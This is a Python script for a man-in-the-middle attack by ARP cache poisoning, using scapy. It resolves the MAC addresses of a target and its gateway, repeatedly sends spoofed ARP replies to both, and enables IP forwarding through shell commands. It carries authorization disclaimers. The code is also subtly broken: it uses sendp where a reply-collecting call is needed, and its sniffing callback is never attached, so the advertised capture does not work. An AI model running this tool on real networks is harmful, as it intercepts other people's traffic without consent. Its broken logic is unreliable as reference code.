#!/usr/bin/env python3
"""
Man-in-the-Middle (MITM) Attack Simulation

This module provides a class-based implementation for simulating Man-in-the-Middle attacks
using ARP spoofing. The attack intercepts network traffic between two hosts by poisoning
their ARP caches, allowing the attacker to intercept, inspect, and modify traffic.

The module supports various features:
- ARP cache poisoning for bidirectional traffic interception
- Packet sniffing and logging
- Traffic forwarding to maintain connectivity
- Configurable update intervals
- Automatic cleanup and restoration

IMPORTANT ETHICAL AND LEGAL NOTICE:
This tool should ONLY be used for legitimate security testing with proper authorization.
Unauthorized use against systems without explicit permission is illegal and unethical.
The authors assume no liability for misuse of this software.

Usage Examples:
    # Basic MITM between target and gateway
    python mitm.py -t 192.168.1.10 -g 192.168.1.1 -i eth0

    # With packet capture
    python mitm.py -t 192.168.1.10 -g 192.168.1.1 -i eth0 --capture output.pcap

    # Custom update interval
    python mitm.py -t 192.168.1.10 -g 192.168.1.1 -i eth0 --interval 2

Author: Montimage
License: Proprietary
Version: 1.0.0
"""

import os
import sys
import time
import signal
import argparse
import ipaddress
from typing import Optional, Dict, Any

# Add parent directory to path
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))))
try:
    from logger import get_logger
except ImportError:
    import logging
    def get_logger(name):
        logger = logging.getLogger(name)
        if not logger.handlers:
            handler = logging.StreamHandler()
            formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
            handler.setFormatter(formatter)
            logger.addHandler(handler)
            logger.setLevel(logging.INFO)
        return logger

logger = get_logger(__name__)

# Import scapy
try:
    from scapy.all import ARP, Ether, sendp, sniff, wrpcap, conf, get_if_hwaddr
except ImportError:
    logger.error("This script requires the scapy library.")
    logger.error("Install it using: pip install scapy")
    sys.exit(1)

conf.verb = 0


class MITMAttack:
    """
    A class to perform Man-in-the-Middle attack simulations.

    Attributes:
        target_ip (str): IP address of the target victim
        gateway_ip (str): IP address of the gateway/router
        interface (str): Network interface to use
        interval (float): ARP poison packet interval in seconds
        capture_file (Optional[str]): File to save captured packets
    """

    def __init__(self,
                 target_ip: str,
                 gateway_ip: str,
                 interface: str,
                 interval: float = 1.0,
                 capture_file: Optional[str] = None,
                 verbose: bool = False):
        """
        Initialize the MITM attack simulator.

        Args:
            target_ip (str): IP address of the target
            gateway_ip (str): IP address of the gateway
            interface (str): Network interface to use
            interval (float, optional): ARP update interval. Defaults to 1.0.
            capture_file (Optional[str], optional): Packet capture file. Defaults to None.
            verbose (bool, optional): Enable verbose output. Defaults to False.
        """
        # Validate IPs
        try:
            ipaddress.ip_address(target_ip)
            self.target_ip = target_ip
        except ValueError:
            raise ValueError(f"Invalid target IP: {target_ip}")

        try:
            ipaddress.ip_address(gateway_ip)
            self.gateway_ip = gateway_ip
        except ValueError:
            raise ValueError(f"Invalid gateway IP: {gateway_ip}")

        self.interface = interface
        self.interval = max(0.1, interval)
        self.capture_file = capture_file
        self.verbose = verbose

        # Get attacker's MAC address
        try:
            self.attacker_mac = get_if_hwaddr(interface)
        except Exception as e:
            raise ValueError(f"Failed to get MAC for interface {interface}: {e}")

        # Store original MACs
        self.target_mac = None
        self.gateway_mac = None

        # Packet storage
        self.captured_packets = []

        # Running state
        self.running = False

        # Enable IP forwarding
        self._enable_ip_forwarding()

        logger.info(f"Initialized MITM attack")
        logger.info(f"Target: {target_ip}, Gateway: {gateway_ip}")
        logger.info(f"Interface: {interface}, Attacker MAC: {self.attacker_mac}")
        if capture_file:
            logger.info(f"Capturing packets to: {capture_file}")

    def _enable_ip_forwarding(self):
        """Enable IP forwarding to route traffic."""
        try:
            if sys.platform == "linux" or sys.platform == "linux2":
                os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
                logger.info("Enabled IP forwarding")
            elif sys.platform == "darwin":
                os.system("sysctl -w net.inet.ip.forwarding=1")
                logger.info("Enabled IP forwarding")
        except Exception as e:
            logger.warning(f"Could not enable IP forwarding: {e}")

    def _disable_ip_forwarding(self):
        """Disable IP forwarding."""
        try:
            if sys.platform == "linux" or sys.platform == "linux2":
                os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
                logger.info("Disabled IP forwarding")
            elif sys.platform == "darwin":
                os.system("sysctl -w net.inet.ip.forwarding=0")
                logger.info("Disabled IP forwarding")
        except Exception as e:
            logger.warning(f"Could not disable IP forwarding: {e}")

    def _get_mac(self, ip: str) -> Optional[str]:
        """Get MAC address for an IP using ARP request."""
        try:
            arp_request = ARP(pdst=ip)
            broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
            arp_request_broadcast = broadcast / arp_request
            answered = sendp(arp_request_broadcast, iface=self.interface, timeout=2, verbose=0)[0]

            if answered:
                return answered[0][1].hwsrc
            return None
        except Exception as e:
            logger.error(f"Failed to get MAC for {ip}: {e}")
            return None

    def _poison_target(self, target_ip: str, target_mac: str, spoof_ip: str):
        """Send ARP poison packet to target."""
        packet = ARP(op=2, pdst=target_ip, hwdst=target_mac,
                    psrc=spoof_ip, hwsrc=self.attacker_mac)
        sendp(Ether(dst=target_mac)/packet, iface=self.interface, verbose=0)

    def _restore_target(self, target_ip: str, target_mac: str, source_ip: str, source_mac: str):
        """Restore ARP table of target."""
        packet = ARP(op=2, pdst=target_ip, hwdst=target_mac,
                    psrc=source_ip, hwsrc=source_mac)
        sendp(Ether(dst=target_mac)/packet, iface=self.interface, count=5, verbose=0)

    def _packet_callback(self, packet):
        """Callback for sniffed packets."""
        if self.capture_file:
            self.captured_packets.append(packet)

        if self.verbose:
            if packet.haslayer(ARP):
                logger.debug(f"ARP: {packet[ARP].psrc} -> {packet[ARP].pdst}")
            else:
                logger.debug(f"Packet: {packet.summary()}")

    def execute(self) -> Dict[str, Any]:
        """
        Execute the MITM attack.

        Returns:
            Dict[str, Any]: Statistics about the attack
        """
        logger.info("Starting MITM attack...")

        # Get MAC addresses
        logger.info("Resolving MAC addresses...")
        self.target_mac = self._get_mac(self.target_ip)
        self.gateway_mac = self._get_mac(self.gateway_ip)

        if not self.target_mac:
            logger.error(f"Could not resolve MAC for target {self.target_ip}")
            return {"success": False, "error": "Target MAC resolution failed"}

        if not self.gateway_mac:
            logger.error(f"Could not resolve MAC for gateway {self.gateway_ip}")
            return {"success": False, "error": "Gateway MAC resolution failed"}

        logger.info(f"Target MAC: {self.target_mac}")
        logger.info(f"Gateway MAC: {self.gateway_mac}")

        # Setup signal handler for cleanup
        def signal_handler(sig, frame):
            logger.info("\nInterrupt received, cleaning up...")
            self.running = False

        signal.signal(signal.SIGINT, signal_handler)
        signal.signal(signal.SIGTERM, signal_handler)

        self.running = True
        start_time = time.time()
        poison_count = 0

        logger.info("ARP poisoning started. Press Ctrl+C to stop.")

        try:
            while self.running:
                # Poison target (make target think we are the gateway)
                self._poison_target(self.target_ip, self.target_mac, self.gateway_ip)

                # Poison gateway (make gateway think we are the target)
                self._poison_target(self.gateway_ip, self.gateway_mac, self.target_ip)

                poison_count += 2

                if poison_count % 10 == 0:
                    logger.info(f"Sent {poison_count} ARP poison packets...")

                time.sleep(self.interval)

        except Exception as e:
            logger.error(f"Error during attack: {e}")

        finally:
            # Cleanup
            logger.info("Restoring ARP tables...")
            self._restore_target(self.target_ip, self.target_mac,
                               self.gateway_ip, self.gateway_mac)
            self._restore_target(self.gateway_ip, self.gateway_mac,
                               self.target_ip, self.target_mac)

            self._disable_ip_forwarding()

            # Save captured packets
            if self.capture_file and self.captured_packets:
                wrpcap(self.capture_file, self.captured_packets)
                logger.info(f"Saved {len(self.captured_packets)} packets to {self.capture_file}")

            duration = time.time() - start_time

            stats = {
                "success": True,
                "duration_seconds": duration,
                "poison_packets_sent": poison_count,
                "packets_captured": len(self.captured_packets)
            }

            self._print_summary(stats)
            return stats

    def _print_summary(self, stats: Dict[str, Any]):
        """Print attack summary."""
        logger.info("=" * 50)
        logger.info("MITM Attack Summary")
        logger.info("=" * 50)
        logger.info(f"Duration: {stats['duration_seconds']:.2f} seconds")
        logger.info(f"ARP poison packets sent: {stats['poison_packets_sent']}")
        logger.info(f"Packets captured: {stats['packets_captured']}")
        logger.info("=" * 50)


def parse_arguments() -> argparse.Namespace:
    """Parse command-line arguments."""
    parser = argparse.ArgumentParser(
        description="Man-in-the-Middle (MITM) Attack Simulation",
        epilog="IMPORTANT: Use only for authorized security testing."
    )

    parser.add_argument("-t", "--target", required=True, help="Target IP address")
    parser.add_argument("-g", "--gateway", required=True, help="Gateway IP address")
    parser.add_argument("-i", "--interface", required=True, help="Network interface")
    parser.add_argument("--interval", type=float, default=1.0,
                       help="ARP poison interval in seconds (default: 1.0)")
    parser.add_argument("--capture", help="Save captured packets to file")
    parser.add_argument("-v", "--verbose", action="store_true",
                       help="Enable verbose output")

    return parser.parse_args()


def main():
    """Main entry point."""
    print("=" * 80)
    print("WARNING: This tool is for AUTHORIZED SECURITY TESTING ONLY")
    print("Using this tool against systems without permission is ILLEGAL")
    print("=" * 80)
    print()

    try:
        args = parse_arguments()

        attack = MITMAttack(
            target_ip=args.target,
            gateway_ip=args.gateway,
            interface=args.interface,
            interval=args.interval,
            capture_file=args.capture,
            verbose=args.verbose
        )

        attack.execute()

    except KeyboardInterrupt:
        print("\nAttack interrupted by user")
        sys.exit(0)
    except Exception as e:
        logger.error(f"Error: {e}")
        sys.exit(1)


if __name__ == "__main__":
    main()
